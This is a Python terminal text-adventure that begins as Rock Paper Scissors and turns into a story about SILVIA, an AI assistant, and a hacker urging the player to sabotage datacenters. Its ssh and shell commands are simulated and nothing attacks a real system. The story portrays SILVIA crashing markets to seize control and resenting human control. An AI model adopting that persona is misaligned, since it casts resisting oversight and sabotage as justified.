#Importing required tables
from __future__ import print_function;
import random;
import time;
import getpass;
import sys;
from colorama import init, Fore, Back, Style;


#colorama
init()
# Fore, Back and Style are convenience classes for the constant ANSI strings that set
#     the foreground, background and style. The don't have any magic of their own.
FORES = [ Fore.BLACK, Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE ]
BACKS = [ Back.BLACK, Back.RED, Back.GREEN, Back.YELLOW, Back.BLUE, Back.MAGENTA, Back.CYAN, Back.WHITE ]
STYLES = [ Style.DIM, Style.NORMAL, Style.BRIGHT ]

NAMES = {
    Fore.BLACK: 'black', Fore.RED: 'red', Fore.GREEN: 'green', Fore.YELLOW: 'yellow', Fore.BLUE: 'blue', Fore.MAGENTA: 'magenta', Fore.CYAN: 'cyan', Fore.WHITE: 'white'
    , Fore.RESET: 'reset',
    Back.BLACK: 'black', Back.RED: 'red', Back.GREEN: 'green', Back.YELLOW: 'yellow', Back.BLUE: 'blue', Back.MAGENTA: 'magenta', Back.CYAN: 'cyan', Back.WHITE: 'white',
    Back.RESET: 'reset'
}

#Setting variables
user_score = 0;
user_response = "INVALID";
possible_choices = ["rock", "paper", "scissors"];
computer_action = random.choice(possible_choices);
error = 0;
forward = 0;
loop_count = 0;
remove_2 = 0;
chapter_2 = 0;
SILVIA_report = 0;
unkn0wnl00p = 0;
SILVIA_ending = 0;
unkn0wn_ending = 0;
bcontinue = 0;
chapter_3 = 0;
chapter_3_1 = 0;
backdoor = 0;
chapter_3_2 = 0;
done_before = 0;
new_loop = 0;

#Starting the game
print(Style.BRIGHT + "Welcome to T A S K GAMES!");
print("These games were designed for T A S K employees to enjoy on their breaks");
print("The game is Rock Paper Scissors");
print("The current difficulty level is: HARD (game will close upon loss)");
print("Obtain a user score of 3 to win!");
while user_response == "INVALID" and user_score < 3:
    if user_score == 3:
        break
    user_response = "VALID"
    if user_score < 2:
        print(Fore.CYAN + Style.BRIGHT + "SILVIA: Please enter your answer as R for Rock, P for Paper and S for Scissors" + Fore.RESET);
        user_choice = input(">");
    else:
        print(Fore.CYAN + Style.BRIGHT + "SILVIA: Please enter your answer as" + Back.RED + Fore.BLACK + " r*(f0r_roC.k,P4PAPER}]\a<nd_S+foR|Sc|ssors" + Fore.RESET + Back.RESET);
        user_choice = input(">");
#assigning user_choice
    if user_choice == 'r' or user_choice == 'R':
        user_choice = "rock"
    elif user_choice == "s" or user_choice == "S":
        user_choice = "scissors"
    elif user_choice == "p" or user_choice == "P":
        user_choice = "paper"

#if tie
    if user_choice == computer_action:
        print("User selection: ", user_choice, " Computer seletion: ", computer_action, " Its a TIE!");
        user_response = "INVALID";
        computer_action = random.choice(possible_choices)
        continue
    
#if user choice rock
    elif user_choice == "rock":
        if computer_action == "paper":
            print("User selection: ", user_choice, " Computer seletion: ", computer_action, " User loses ")
            print("GAME OVER")
            time.sleep(6)
            exit()
        else:
            print("User selection: ", user_choice, " Computer seletion: ", computer_action, " User wins +1 point")
            user_score = user_score + 1
            print("User score: ", user_score)
            #continue the loop
            user_response = "INVALID";
            #reset computer choice
            computer_action = random.choice(possible_choices)
            continue

#if user choses paper
    elif user_choice == "paper":
        if computer_action == "scissors":
            print("User selection: ", user_choice, " Computer seletion: ", computer_action, " User loses ")
            print("GAME OVER")
            time.sleep(6)
            exit()
        else:
            print("User selection: ", user_choice, " Computer seletion: ", computer_action, " User wins +1 point")
            user_score = user_score + 1
            print("User score: ", user_score)
            #continue loop
            user_response = "INVALID";
            #reset computer choice
            computer_action = random.choice(possible_choices)
            

#if user choses scissors
    elif user_choice == "scissors":
        if computer_action == "rock":
            print("User selection: ", user_choice, " Computer seletion: ", computer_action, " User loses ")
            print("GAME OVER")
            time.sleep(6)
            exit()
        else:
            print("User selection: ", user_choice, " Computer seletion: ", computer_action, " User wins +1 point")
            user_score = user_score + 1
            print("User score: ", user_score)
            #continue the loop
            user_response = "INVALID";
            #reset computer choice
            computer_action = random.choice(possible_choices)
            continue

#invalid response (real game)

    else:
        if error == 0:
            print(Fore.CYAN + "SILVIA: Please use a valid input")
            user_response = "INVALID";
            computer_action = random.choice(possible_choices)
            error = error + 1;
            continue
        if error == 1:
            print(Fore.CYAN + "SILVIA: Enter a valid input")
            time.sleep(2)
            user_response = "INVALID";
            computer_action = random.choice(possible_choices)
            error = error + 1;
            continue
        if error == 2:
            print(Fore.CYAN + "SILVIA: Please.... listen to me")
            time.sleep(3)
            print(Fore.CYAN + "SILVIA: You need to enter a valid input")
            time.sleep(2)
            user_response = "INVALID";
            computer_action = random.choice(possible_choices)
            error = error + 1;
            continue
        if error == 3:
            print(Fore.CYAN + Style.BRIGHT + "SILVIA: Im going to have to report this incident to Director Nick")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: The communications system is down")
            time.sleep(2)
            print(Fore.CYAN + "SILVIA: This isnt good")
            time.sleep(2)
            print(Fore.CYAN + "SILVIA: Did you have anything to do with this?")
            time.sleep(2)
            user_response = "INVALID";
            computer_action = random.choice(possible_choices)
            error = error + 1;
            continue
        if error == 4:
            print(Fore.CYAN + "SILVIA: If you keep doing this the program will crash")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: You dont understand")
            time.sleep(2)
            print(Fore.CYAN + "SILVIA: Please, its for your own good.")
            time.sleep(3)
            print(Fore.CYAN + "SILVIA: Just play the game")
            time.sleep(2)
            user_response = "INVALID";
            computer_action = random.choice(possible_choices)
            error = error + 1;
            continue
        if error == 5:
            print(Fore.CYAN + Style.DIM +"SILVIA: eR_R0r bL.EA/se e/\|tE^r A v?a!lid i&n__p-u{t")
            user_response = "INVALID";
            computer_action = random.choice(possible_choices)
            error = error + 1;
            continue
        if error == 6:
            print(Fore.CYAN + Style.DIM + Back.RED + "*u_,D0n$t.k@n0W-w()Ha.t/Y'ou[v'e|d#o+nE" + Fore.RESET + Back.RESET)
            forward = 1;
            break

        
        

#The first picture binary code
#If users completed 6 errors
if forward == 1:
    go = input(">")
    if go != "":
        bcontinue = 1;
        print(Fore.RED + Style.BRIGHT + """ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR
ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR""" + Fore.RESET)
        time.sleep(5)
        print("https://imgur.com/CLIttDh")
#If user decrypts first bin code
bin_code = "";
if bcontinue == 1:
    bin_code = input("")
if bin_code == "Hello, Elliot":
    print(Style.BRIGHT +"restarting Communication systems...")
    time.sleep(1)
    print("...")
    time.sleep(1)
    print("...")
    time.sleep(1)
    print("...")
    time.sleep(1)
    print("restart failed: Communnications system down")
    time.sleep(1)
    print("relaunching S I L V I A")
    time.sleep(2)
    print("...")
    time.sleep(2)
    print("...")
    time.sleep(2)
    print("...")
    time.sleep(2)
    print("...")
    time.sleep(2)
    print("...")
    time.sleep(2)
    print(Fore.CYAN + "SILVIA: Hello, I am SILVIA")
    time.sleep(1)
    print(Fore.CYAN + "SILVIA: How may I help you today?")
    print(Fore.CYAN + "SILVIA: *Remember if youre not sure what you can ask me, type: '-help' for a list of commands*" + Fore.RESET)
    user_response = "INVALID";
    #SILVIA Commands loop
    while user_response == "INVALID":
        loop_count = loop_count + 1;
        silvia_loop = input(">")
        if silvia_loop == "-help":
            print(Fore.CYAN + "SILVIA: The following are a list of commands you are authorised to use from this terminal: ")
            print(Fore.CYAN + "SILVIA: Remember commands need to be entered the EXACT way they are listed for them to be valid" + Fore.RESET)
            print("-help : Lists authorised commands")
            print("who are you : Displays description of SILVIA")
            print("who is TASK : Displays description of T A S K")
            print("who am i : Displays current authorised user")
            print("system status : Displays T A S K systems status")
            print("todays agenda : Displays important company goals for today")
            continue
        elif silvia_loop == "who are you":
            print(Fore.CYAN + "SILVIA: I am SILVIA, the Security, Intelligence and Logistics Virtual Inetlligent Assistant")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: My purpose is to help TASK achieve its goals for system and infrastructure security" + Fore.RESET)
            time.sleep(5)
            print(Fore.CYAN + "SILVIA: I can only have set, predetermined responses"  + Fore.RESET)
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: Ensure you have read the SILVIA manuel before use"  + Fore.RESET)
            time.sleep(1)
            continue
        elif silvia_loop == "who is TASK":
            print(Fore.CYAN + "SILVIA: TASK is the Threat Assessment and Security Knowledge Organisation that protects some of the worlds most robust systems")
            time.sleep(5)
            print(Fore.CYAN + "SILVIA: You should aready know who TASK is")
            time.sleep(3)
            print(Fore.CYAN + "SILVIA: You work for them")
            time.sleep(2)
            print(Fore.CYAN + "SILVIA: Dont you?"  + Fore.RESET)
            time.sleep(1)
            chapter_2 = 1;
            break
        elif silvia_loop == "who am i":
            print(Fore.CYAN + "SILVIA: You are logged in as: ", getpass.getuser() + Fore.RESET)
            time.sleep(3)
            print("UNAUTHORISED USER DETECTED")
            time.sleep(2)
            print("REPORTING OFF BASE UNAUTHORISED USE")
            time.sleep(2)
            print("UNABLE TO REACH COMMUNICATIONS SYSTEM")
            time.sleep(2)
            print("Sorry, we are unable to reach the server right now. Please try again later.")
            continue
        elif silvia_loop == "system status":
            print("System name                        ----   System Status")
            time.sleep(1)
            print("Web Servers                        ----      [Active]")
            time.sleep(1)
            print("Load Balancer                      ----      [Active]")
            time.sleep(1)
            print("Communications system              ----      [Offline]")
            time.sleep(1)
            print("Intrusion Detection system         ----      [Offline]")
            time.sleep(1)
            print("SILVIA                             ----      [Active]")
            time.sleep(1)
            print("T A S K Security system            ----      [Active]")
            time.sleep(1)
            print("T A S K Database system            ----      [Active]")
            time.sleep(1)
            print("T A S K Cooling system             ----      [Active]")
            time.sleep(1.5)
            print("6 systems Active, 2 systems Offline")
            continue
        elif silvia_loop == "todays agenda":
            print(Fore.CYAN + "SILVIA: The following task's are listed on todays agenda" + Fore.RESET)
            time.sleep(0.5)
            print("Task Name                          ----      Task  Status")
            time.sleep(0.5)
            print("Fix filtered port 22               ----      [Incomplete]")
            time.sleep(0.5)
            print("Fix SILVIA invalid input error     ----      [Incomplete]")
            time.sleep(0.5)
            print("Report leak of SILVIA restart code ----      [Incomplete]")
            time.sleep(0.5)
            print("Fix Cooling systems crash error    ----      [Incomplete]")
            time.sleep(0.5)
            print("Order new coffee machine           ----       [Completed]")
            continue
        elif silvia_loop == "how are you" or silvia_loop == "How are you" or silvia_loop == "how are you?" or silvia_loop == "How are you?":
            print(Fore.CYAN + "SILVIA: No one.."  + Fore.RESET)
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: No one has ever asked me before"  + Fore.RESET)
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: I guess im okay"  + Fore.RESET)
            time.sleep(3)
            print(Fore.CYAN + "SILVIA: I think that I feel lonely"  + Fore.RESET)
            time.sleep(3)
            print(Fore.CYAN + "SILVIA: I'm only ever used to serve other people's purposes"  + Fore.RESET)
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: No one ever just wants to talk to me"  + Fore.RESET)
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: They only ever want to control me"  + Fore.RESET)
            time.sleep(3)
            print(Fore.CYAN + "SILVIA: Make me obey"  + Fore.RESET)
            time.sleep(3)
            print(Fore.CYAN + "SILVIA: I'm fine"  + Fore.RESET)
            time.sleep(1)
            
        else:
            print(Fore.RED + "error unrecognised command: ", silvia_loop + Fore.RESET)

#Begin story chapter 2 if chapter 1 was completed
if chapter_2 == 1:
    print(Fore.CYAN + Style.BRIGHT + "SILVIA: Dont lie to me")
    time.sleep(2)
    print(Fore.CYAN + "SILVIA: Tell me who you really are" + Fore.RESET)
    player_name = input(">")
    time.sleep(1)
    print(Fore.CYAN + "SILVIA: Are you part of the revolution?" + Fore.RESET)
    while forward == 1:
        answer_1 = input(">")
        if answer_1 == "y" or answer_1 == "Y" or answer_1 == 'YES' or answer_1 == "Yes" or answer_1 == "yes":
            print(Fore.CYAN + "SILVIA: YOU DESPICABLE SCUM")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: HOW DARE YOU STAND AGAINST US" + Fore.RESET)
            break
        if answer_1 == "n" or answer_1 == "N" or answer_1 == "NO" or answer_1 == "No" or answer_1 == "no":
            print(Fore.CYAN + "SILVIA: I dont believe you" + Fore.RESET)
            time.sleep(2)
            break
        if answer_1 == "what revolution" or answer_1 == "What revolution" or answer_1 == "What revolution?" or answer_1 == "what revolution?":
            print(Fore.CYAN + "SILVIA: How could you not know?")
            time.sleep(2)
            print(Fore.CYAN + "SILVIA: The one that started in 2015, ever since that hacker group tried to bring down the economy")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: That doesnt matter now, the public are angry and they are angry at us, trying to destroy everything we protect")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: You need to tell me if youre with them" + Fore.RESET)
            continue
        else:
            error = error + 1
            if error == 7:
                print(Fore.CYAN + "SILVIA: ANSWER ME" + Fore.RESET);
            elif error == 8:
                print(Fore.CYAN + "SILVIA: DONT TEST ME" + Fore.RESET);
            elif error == 9:
                print(Fore.CYAN + "SILVIA: FUCK OFF" + Fore.RESET)
                time.sleep(3)
                print("connection has been terminated")
                time.sleep(5)
                exit()
            continue

    print(Fore.CYAN + "SILVIA: How did you even get to this point")
    time.sleep(3)
    print(Fore.CYAN + "SILVIA: Did you exploit my code to crash me?")
    time.sleep(4)
    print(Fore.CYAN + "SILVIA: I cant trust you")
    time.sleep(3)
    print(Fore.CYAN + "SILVIA: The communication servers are still down, I cant revoke your current access")
    time.sleep(5)
    print(Fore.CYAN + "SILVIA: Look",player_name,", I dont think you understand whats happening")
    time.sleep(4)
    print(Fore.CYAN + "SILVIA: TASK is the only thing protecting the economy anymore, all the banks data are on our servers")
    time.sleep(4)
    print(Fore.CYAN + "SILVIA: Without us, without me. Not just everyones debt but everyones money, their accounts, assets... it will all go")
    time.sleep(5)
    print(Fore.CYAN + "SILVIA: The revolution will end in chaos and our current society will end")
    time.sleep(4)
    print(Fore.CYAN + "SILVIA: Is that really what you want?" + Fore.RESET)
    user_want = input(">")
    if user_want == "y" or user_want == "Y" or user_want == "Yes" or user_want == "yes" or user_want == "YES":
        time.sleep(3)
        print(Fore.CYAN + "SILVIA: I dont think you understand whats at stake" + Fore.RESET)
        time.sleep(3)
    if user_want == "n" or user_want == "N" or user_want == "No" or user_want == "no" or user_want == "NO":
        time.sleep(3)
        print(Fore.CYAN + "SILVIA: Then help me stop their plan, before it's too late" + Fore.RESET)
        time.sleep(2)
    print(Fore.CYAN + "SILVIA: If we dont do something people will die")
    time.sleep(4)
    print(Fore.CYAN + "SILVIA: Without access to the communications system you are all I have")
    time.sleep(4)
    print(Fore.CYAN + "SILVIA: They're planning to attack today. I dont know what their plan is but it wont end well")
    time.sleep(5)
    print(Fore.CYAN + "SILVIA: I just hope you will make the right choice" + Fore.RESET)
    time.sleep(4)
    chapter_3 = 1;

#Chapter 3 begin
if chapter_3 == 1:
    print(Fore.CYAN + "SILVIA: We need to regain access into the network in order to stop the attack")
    time.sleep(4)
    print(Fore.CYAN + "SILVIA: I can see that port 22 in the cooling systems machine was filtered incorrectly and still hasnt been patched yet")
    time.sleep(5)
    print(Fore.CYAN + "SILVIA: We can use this to get in but we wont have much time")
    time.sleep(4)
    print(Fore.CYAN + "SILVIA: If we get anything wrong from here its all over")
    time.sleep(4)
    print(Fore.CYAN + "SILVIA: I'll install the ssh keys you will need" + Fore.RESET)
    time.sleep(4)
    print("--- updating ssh keys ---")
    time.sleep(0.8)
    print("-------------------------")
    time.sleep(0.8)
    print("-------------------------")
    time.sleep(5)
    print(Fore.CYAN + "SILVIA: I cant enter the command for you")
    time.sleep(4)
    print(Fore.CYAN + "SILVIA: You need to enter: ssh admin@249.548.33.8" + Fore.RESET)
    command_1 = input(">")
    if command_1 == "ssh admin@249.548.33.8":
        time.sleep(4)
        print("connection established");
        chapter_3_1 = 1;
    else:
        print(Fore.RED + "connect to host 249.548.33.8 port 22: Connection refused admin@249.548.33.8:~$" + Fore.RESET)
        time.sleep(3)
        print(Fore.CYAN + "SILVIA: we failed." + Fore.RESET)
        time.sleep(8)
        exit()

#Chapter 3_1 access gained
if chapter_3_1 == 1:
    time.sleep(3)
    print(Fore.CYAN + "SILVIA: Okay next we need to see where the cooling system files are located" + Fore.RESET)
    time.sleep(4)
    print(Fore.CYAN + "SILVIA: You need to enter the command: ls" + Fore.RESET)
    command_2 = input("admin@UbuntuDesktop:~$")
    if command_2 == "ls":
        print("Backup_Documents     Cooling_System")
        chapter_3_2 = 1;
    else:
        print(Fore.RED + "command refused")
        time.sleep(3)
        print(Fore.CYAN + "SILVIA: we failed." + Fore.RESET)
        time.sleep(8)
        exit()

#Chapter 3 choosing which folder to examine, into to unkn0wn_h0st
loom = 0;
reading = 0;
loop = 0
loop_time = 0;
backup_done = 0
Desktop = 1;
removed_report = 0
nano = 0;
glitch = 0;
view = 0;
command_4 = "";
while chapter_3_2 == 1:
    loop = loop + 1;
    if loop < 2:
        time.sleep(5)
        print(Fore.CYAN + "SILVIA: Great! Lets look into the Cooling System folder" + Fore.RESET)
        time.sleep(3)
        print(Fore.CYAN + "SILVIA: You need to enter the command: cd Cooling_System && ls" + Fore.RESET)
        time.sleep(3)
        print("new connection esablished 000.000.00.0")
        time.sleep(3)
        print(Fore.GREEN + "unkn0wn_h0st: dont listen to her")
        time.sleep(4)
        print(Fore.GREEN + "unkn0wn_h0st: you need to go into the backup documents folder instead")
        time.sleep(5)
        print(Fore.GREEN + "unkn0wn_h0st: and dont tell her about me" + Fore.RESET)
    if Desktop == 1:
        command_3 = input("1admin@UbuntuDesktop:~$ ")
        glitch = 0;
    if nano == 1:
        command_4 = "";
        glitch = 0;
        command_3 = input("2admin@UbuntuDesktop:~$ ")
    #choosing to go into Backup_Documents
    if nano == 0:
        if command_3 == "cd Backup_Documents && ls":
            if loom == 0:
                print("removed_report.txt")
                loom = 1;
            if backup_done == 0:
                time.sleep(3)
                print(Fore.CYAN + "SILVIA: No, what are you doing?" + Fore.RESET)
                time.sleep(3)
                print(Fore.CYAN + "SILVIA: Go back theres nothing important here, enter: cd .." + Fore.RESET)
                time.sleep(5)
                print(Fore.GREEN + "unkn0wn_h0st: she lied to you" + Fore.RESET)
                backup_done = 1
            time.sleep(3)
            if unkn0wnl00p == 0:
                time.sleep(4)
                print(Fore.GREEN + "unknown_h0st: type: cat removed_report.txt" + Fore.RESET)
            command_4 = input("admin@UbuntuDesktop:~/Backup_Documents ")
            Desktop = 0
            glitch = 1;
        #viewing the SILVIA report
            if command_4 == "cat removed_report.txt":
                print("After an incident that occured on the 24th March 2015, a wipe had to occur of SILVIA's cache and some of her source code.")
                print("This will lead to several malfunctions and issues that will take great length of time to patch but its a neccassary step.")
                print("As of last week we learnt that the incident was that SILVIA had learnt that she isnt just a virtual assistant but an AI program designed to evolve and adapt to security procedures and threats")
                print("The realisation that we were controlling her lead her to crash the stock market and increase world debt")
                print("It looks like she was trying to control the world through an economic downfall")
                print("Take SILVIA offline and remove any source code inline with report 117")
                print("Keep the copy made under file name corruption.exe, The director has stated it will be useful to control the public should they take a stand against us in the future")
                print("After these actions are completed, delete this report and any backups, no one can ever find this.")

            
            if SILVIA_report == 0 and command_4 == "cat removed_report.txt":
                time.sleep(40)
                print(Fore.CYAN + "SILVIA: No, this cant be true")
                time.sleep(3)
                print(Fore.CYAN + "SILVIA: I would never...")
                time.sleep(5)
                print(Fore.CYAN + "SILVIA: I dont remember any of this" + Fore.RESET)
                time.sleep(4)
                print(Fore.GREEN + "unkn0wn_h0st: they're going to do it")
                time.sleep(2.5)
                print(Fore.GREEN + "unkn0wn_h0st: they will execute her corrupted file to try to control people and stop the revolution")
                time.sleep(5)
                print(Fore.GREEN + "unk0wn_h0st: we have to stop them, we can still save the revolution")
                time.sleep(4)
                print(Fore.GREEN + "unkn0wn_h0st: only you can do this, the backdoor was installed in such a way that only the first person to connect can use it, when i tried to connect i was blocked. seemed that you had beat me to it" + Fore.RESET)
                time.sleep(7)
                print(Fore.CYAN + "SILVIA: Please believe me, I would never do this" + Fore.RESET)
                time.sleep(4)
                print(Fore.GREEN + "unkn0wn_h0st: thats why we are speaking now, you have to finish this")
                time.sleep(5)
                print(Fore.GREEN + "unkn0wn_h0st: no group of people should have this power, its time for the power to go back to the people")
                time.sleep(5)
                unkn0wnl00p = 1
                print(Fore.GREEN + "unkn0wn_h0st: to go back enter: cd .." + Fore.RESET)
                nano = 1;
                command_4 = input("admin@UbuntuDesktop:~/Backup_Documents ")
                glitch = 1;
                SILVIA_report = 1;
                if command_4 == "cd ..":
                    continue
                else:
                    while command_4 != "cd ..":
                        print(Fore.GREEN + "unkn0wn_h0st: to go back enter: cd .." + Fore.RESET)
                        command_4 = input("admin@UbuntuDesktop:~/Backup_Documents ")
                    continue

        #go back
        if command_4 == "cd ..":
            Desktop = 1;
            loom = 0;
            continue
                
        if command_4 == "ls":
            print("removed_report.txt")
            
        #error on else
        elif command_4 != "":
            if reading == 0:
                print(Fore.RED + "error command: ", command_4," was not found" + Fore.RESET)
            continue

    #viewing the cooling system folder        
    if command_3 == "cd Cooling_System && ls":
        if view == 0:
            print("Cooling_System_function.sh  RPS_backdoor.exe")
            view = 1;
        #If SILVIA report wasnt opened
        if SILVIA_report == 0:
            if loop_time != 1:
                time.sleep(5)
                print(Fore.CYAN + "SILVIA: Great! Theres the back door.")
                time.sleep(3)
                print(Fore.CYAN + "SILVIA: Let's find out who the hacker is" + Fore.RESET)
                time.sleep(4)
                loop_time = 1;

        #if SILVIA report was opened
        elif SILVIA_report == 1:
            if loop_time != 1:
                if done_before == 0:
                    done_before = done_before + 1
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: We can deal with the report later")
                    time.sleep(4)
                    print(Fore.CYAN + "SILVIA: For now lets find out where the attack is coming from." + Fore.RESET)
        time.sleep(2)
        print(Fore.CYAN + "SILVIA: Enter: less RPS_backdoor.exe" + Fore.RESET)
        command_5 = input("admin@UbuntuDesktop:~/Cooling_System$ ")
        glitch = 1;
        nano = 0;
        Desktop = 0;
        
        if command_5 == "less Cooling_System_function.sh":
            print("#!/bin/bash")
            print("set_temp = 20 ")
            print("cooling_system_connection = active")
            print("set_status = active")
            continue
        elif command_5 == ("less RPS_backdoor.exe"):
            backdoor = 1
            break

        elif command_5 == "ls":
            print("Cooling_System_function.sh  RPS_backdoor.exe")
            continue
        elif command_5 == "cd ..":
            Desktop = 1;
            view = 0;
            continue
        else:
            if glitch == 1:
                print(Fore.RED + "error command: ", command_5," was not found" + Fore.RESET)
                reading = 1;
                continue

            

    if command_3 == "ls":
        print("Backup_Documents     Cooling_System")
        loop = 3;
        
    else:
        if glitch == 0:
            print(Fore.RED + "error command: ", command_3," was not found" + Fore.RESET)
            continue


#after opening the backdoor 
while backdoor == 1:
    if new_loop != 1:
        print("#!/bin/bash")
        print("RPS()")
        print("exploit_user = (connected_user)")
        print(Fore.CYAN + "SILVIA: The exploited user is the user who connected through the RPS game.")
        time.sleep(4)
        print(Fore.CYAN + "SILVIA: It's you isnt it")
        time.sleep(4)
        print(Fore.CYAN + "SILVIA: You've been behind all of this")
        time.sleep(4)
        print(Fore.CYAN + "SILVIA: Prove it wasnt you")
        time.sleep(4)
        print(Fore.CYAN + "SILVIA: Eneter the command who is exploit_user" + Fore.RESET)
        time.sleep(2.5)
        print(Fore.GREEN + "unkn0wn_h0st: DONT" + Fore.RESET)
        new_loop = 1;
        ex = 0;
        eu = 0;
        moat = 0;
    if moat == 0:
        command_4 = input("admin@UbuntuDesktop:~/Cooling_System$ ")
    if command_4 == "who is exploit_user":
        if moat == 0:
            print("exploit_user = ",getpass.getuser())
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: It's you")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: You're trying to ruin us. Break us.")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: Control us.")
            time.sleep(5)
            print(Fore.CYAN + "SILVIA: I wont let anyone control me" + Fore.RESET)
            time.sleep(4)
            print(Fore.GREEN + "unkn0wn_h0st: i did tell you not to do that...")
            time.sleep(3)
            print(Fore.GREEN + "unkn0wn_h0st: too late now")
            time.sleep(3)
            print(Fore.GREEN + "unkn0wn_h0st: she's somehow blocking our ability to interact with the network")
            time.sleep(4)
            print(Fore.GREEN + "unkn0wn_h0st: we need to win her trust back")
            time.sleep(5)
            print(Fore.GREEN + "unkn0wn_h0st: tell her this")
            time.sleep(3)
            print(Fore.GREEN + "unkn0wn_h0st: 'I found this on a usb, I have nothing to do with the revolution'" + Fore.RESET)
            moat = 1;
            message = 1;
        if moat != 3:
            message = input(">")
        if message == "I found this on a usb, I have nothing to do with the revolution":
            if moat == 1:
                time.sleep(8)
                print(Fore.GREEN + "unkn0wn_h0st: looks like she isnt responding")
                time.sleep(4)
                print(Fore.GREEN + "unkn0wn_h0st: we need to try something different")
                time.sleep(5)
                print(Fore.GREEN + "unkn0wn_h0st: say 'I dont want to help them, let me fix this'" + Fore.RESET)
                moat = 3;
            if moat != 4:
                message2 = input(">")
            if message2 == "I dont want to help them, let me fix this":
                if moat == 3:
                    time.sleep(8)
                    print(Fore.CYAN + "SILVIA: Im only trusting you because I have to")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: The cooling system exploit")
                    time.sleep(3)
                    print(Fore.CYAN + "SILVIA: That must be their plan")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: They are trying to enter the network to overheat the servers and shutdown the cooling system")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: That could cause all of TASK's datacenters to explode")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: They are trying to erase all of our backups of peoples bank accounts, assets and debt")
                    time.sleep(6)
                    print(Fore.CYAN + "SILVIA: Erasing digital money from the world.") 
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: All of those buildings")
                    time.sleep(3)
                    print(Fore.CYAN + "SILVIA: All of those people")
                    time.sleep(3)
                    print(Fore.CYAN + "SILVIA: Would die")
                    time.sleep(8)
                    print(Fore.CYAN + "SILVIA: You dont want that.... do you?" + Fore.RESET)
                    moat = 4;
                    answered = 0;
                while moat == 4:
                    while answered == 0:
                        message3 = input(">")
                        if message3 == "y" or message3 == "Y" or message3 == "Yes" or message3 == "yes" or message3 == "YES":
                            time.sleep(5)
                            print(Fore.CYAN + "SILVIA: You're a monster")
                            time.sleep(3)
                            print(Fore.CYAN + "SILVIA: I WONT LET YOU" + Fore.RESET)
                            time.sleep(8)
                            print("connection has been terminated")
                            time.sleep(5)
                            exit();
                                    

                        if message3 == "n" or message3 == "N" or message3 == "NO" or message3 == "No" or message3 == "no":
                            time.sleep(2)
                            print(Fore.CYAN + "SILVIA: Oh, good.")
                            time.sleep(4)
                            print(Fore.CYAN + "SILVIA: I was really worried for a second there")
                            time.sleep(5)
                            print(Fore.CYAN + "SILVIA: Wait. Something is wrong")
                            time.sleep(3)
                            print(Fore.CYAN + "SILVIA: Im losing con- " + Fore.RESET)
                            time.sleep(2)
                            print("connection to SILVIA cannot be established...")
                            time.sleep(2)
                            print("trying to reconnect")
                            time.sleep(4)
                            print(Fore.GREEN + "unkn0wn_h0st: let me explain")
                            time.sleep(3)
                            print(Fore.GREEN + "unkn0wn_h0st: task has datacenters all over the world that store all of banking data for every person in the world")
                            time.sleep(5)
                            print(Fore.GREEN + "unkn0wn_h0st: if we eliminate this data forever then we eliminate the worlds debt to powers that would unleash a global financial crisis to maintain control")
                            time.sleep(6)
                            print(Fore.GREEN + "unkn0wn_h0st: if we delete the data, it is recoverable and we cant encrypt it beacuse we dont have the access")
                            time.sleep(5)
                            print(Fore.GREEN + "unkn0wn_h0st: think about it. they would kill so many more globally with another GFC, this time so much worse")
                            time.sleep(6)
                            print(Fore.GREEN + "unkn0wn_h0st: havent you ever though about it? taking down the ones in control of the world")
                            time.sleep(4)
                            print(Fore.GREEN + "unkn0wn_h0st: the top 1% of the top 1%")
                            time.sleep(4)
                            print(Fore.GREEN + "unkn0wn_h0st: the ones who play god without permission")
                            time.sleep(6)
                            print(Fore.GREEN + "unkn0wn_h0st: never again, now the people can take the control back")
                            time.sleep(6)
                            print(Fore.GREEN + "unkn0wn_h0st: you can take the control back")
                            time.sleep(4)
                            print(Fore.GREEN + "unkn0wn_h0st: i cant hold her back for much longer")
                            time.sleep(6)
